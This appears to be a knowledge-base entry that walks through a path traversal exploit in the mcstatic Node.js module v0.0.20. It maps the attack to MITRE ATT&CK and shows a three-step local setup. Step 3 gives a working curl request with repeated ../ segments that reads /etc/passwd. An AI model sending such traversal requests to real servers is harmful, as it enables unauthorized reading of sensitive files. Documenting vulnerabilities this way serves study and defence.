---
tags:
  - path-traversal
  - directory-traversal
  - node-js
  - file-read
  - vulnerability
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/mcstatic]]'
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
commands:
  - '[[commands/npm-i-mcstatic]]'
  - '[[commands/mcstatic-start-server]]'
  - '[[commands/curl-path-traversal-exploit]]'
platforms:
  - Web
  - Node.js
  - Linux
complexity: medium
procedures:
  - '[[procedures/Install-Vulnerable-mcstatic-Module]]'
  - '[[procedures/Start-mcstatic-Server]]'
  - '[[procedures/Exploit-Path-Traversal-to-Read-Files]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
description: >-
  A multi-stage attack exploiting a path traversal vulnerability in the mcstatic
  Node.js module (v0.0.20) to read arbitrary files on the server, such as
  /etc/passwd, by installing the module, starting the server, and sending a
  crafted HTTP request.
skill_level: intermediate
impact_level: high
id: d37213ee-814d-4fda-947e-fe4497035df6
created_at: '2025-12-14T17:26:16.815Z'
updated_at: '2025-12-14T17:26:16.815Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# Server Directory Traversal in mcstatic Node.js Module to Read Arbitrary Local Files

Multi-stage attack chain demonstrating exploitation of improper path sanitization in the mcstatic Node.js module version 0.0.20, allowing attackers to traverse directories and read sensitive local files like /etc/passwd via a crafted HTTP request.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Vulnerable Module] --> B[Start Server] --> C[Exploit Traversal]
    C --> D[Read Arbitrary Files]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/mcstatic]]
- [[tools/curl]]

### Target Environment

- Node.js runtime environment
- Local server access for installation and execution
- Port 6060 available for server binding

### Initial Access Requirements

- Local machine with Node.js and npm installed
- No remote credentials needed; assumes attacker can install and run modules locally to demonstrate or in a controlled environment
- Network access to localhost:6060

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-Vulnerable-mcstatic-Module]]

**Objective**: Set up the vulnerable mcstatic module version 0.0.20 to prepare for server execution.

**Instructions**: Use [[commands/npm-i-mcstatic]] to install the module from the npm registry:

```bash
npm i mcstatic
```

**Expected Output**: Installation logs confirming the package is added to node_modules, including dependencies.

**Success Indicators**:
- mcstatic directory appears in node_modules
- No installation errors

### Step 2: Start mcstatic Server
procedure: [[procedures/Start-mcstatic-Server]]

**Objective**: Launch the HTTP server on port 6060 to expose the path traversal vulnerability in file serving.

**Instructions**: Execute [[commands/mcstatic-start-server]] from the module's bin directory:

```bash
./node_modules/mcstatic/bin/mcstatic --port 6060
```

**Expected Output**: Server startup message like "Server listening on port 6060".

**Success Indicators**:
- Server process running without errors
- Accessible via http://127.0.0.1:6060

### Step 3: Exploit Path Traversal
procedure: [[procedures/Exploit-Path-Traversal-to-Read-Files]]

**Objective**: Send a crafted HTTP request to traverse directories and read a sensitive file like /etc/passwd.

**Instructions**: With the server running, use [[commands/curl-path-traversal-exploit]] to request the file:

```bash
curl --path-as-is 'http://127.0.0.1:6060/../../../../../../../../../etc/passwd'
```

**Expected Output**: Contents of /etc/passwd, displaying user entries such as root:x:0:0:root:/root:/bin/bash.

**Success Indicators**:
- File contents returned in response
- No 404 or access denied errors

## Attack Chain Summary

### Key Achievements

1. Successful installation and startup of the vulnerable mcstatic server
2. Exploitation of path traversal to bypass directory restrictions
3. Unauthorized read of sensitive system files, demonstrating high-impact information disclosure

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01*
